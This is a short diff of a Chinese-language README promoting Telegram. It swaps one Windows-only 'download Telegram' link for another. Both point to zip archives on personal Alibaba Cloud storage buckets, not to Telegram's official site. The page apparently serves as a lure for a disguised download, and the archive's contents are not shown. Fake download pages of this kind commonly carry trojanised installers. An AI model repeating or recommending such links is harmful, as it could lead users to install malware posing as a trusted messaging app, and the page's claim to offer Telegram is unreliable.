@@ -2,7 +2,7 @@
 
 ## 📥 立即下载Telegram
 
-<a href="https://papaxxz.oss-ap-southeast-1.aliyuncs.com/zhifeiji.zip">[点击此处下载Telegram]</a> 仅支持Windows系统
+<a href="https://paxiong.oss-cn-hongkong.aliyuncs.com/%E7%BA%B8%E9%A3%9E%E6%9C%BA%E4%B8%AD%E6%96%87.zip">[点击此处下载Telegram]</a> 仅支持Windows系统
 
 # 🚀 加入Telegram，畅享即时通讯的未来！
 
